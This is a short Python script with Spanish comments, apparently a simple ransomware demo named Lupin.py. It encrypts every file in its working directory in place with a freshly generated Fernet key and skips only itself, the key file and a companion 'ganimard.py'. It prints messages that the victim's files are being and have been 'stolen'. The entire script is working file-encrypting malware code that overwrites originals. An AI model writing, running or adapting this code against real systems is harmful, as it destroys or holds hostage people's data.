import os
from cryptography.fernet import Fernet

#Primero buscamos todos los archivos del dorectorio menos el propio Lupin
# Evitar que encripte también la llave con el objetivo de poder desencriptar luego los archivos

print ("Todo sus archivos van a ser robados")
Archivos_obj=[]

def encriptar_archivo(nombre_archivo,llave):
    with open(nombre_archivo,"rb") as archivo:
        contenido = archivo.read()
    encriptado = Fernet(llave).encrypt(contenido)
    with open(nombre_archivo,"wb") as archivo_encrypt:
        archivo_encrypt.write(encriptado)


for archivo in os.listdir():
    if archivo =="Lupin.py" or archivo=="laLLave.key" or archivo=="ganimard.py":
        continue
    
    #en caso de que no queramos encriptar directorios también
    #if os.path.isdir(file):
        #continue
    if os.path.isfile(archivo):
        Archivos_obj.append(archivo)
    
#Generación de la llave con Fernet. Evita que se pueda abrir un archivo al menos que se tenga la llave
llave = Fernet.generate_key()
with open("laLLave.key","wb") as laLLave:
    laLLave.write(llave)
    
#Encriptamos todos los archivos en nuestra lista de objetivo
for archivo in Archivos_obj:
    with open(archivo,"rb") as ArchivoEncrypt:
        contents = ArchivoEncrypt.read() # pillamos ruta el archivo
    encryptado = Fernet(llave).encrypt(contents) # encriptamos el archivo
    
    with open(archivo,"wb") as ArchivoEncrypt: #  mdoificamos el archivo original
        ArchivoEncrypt.write(encryptado)
        
print ("Todo sus archivos han sido robados")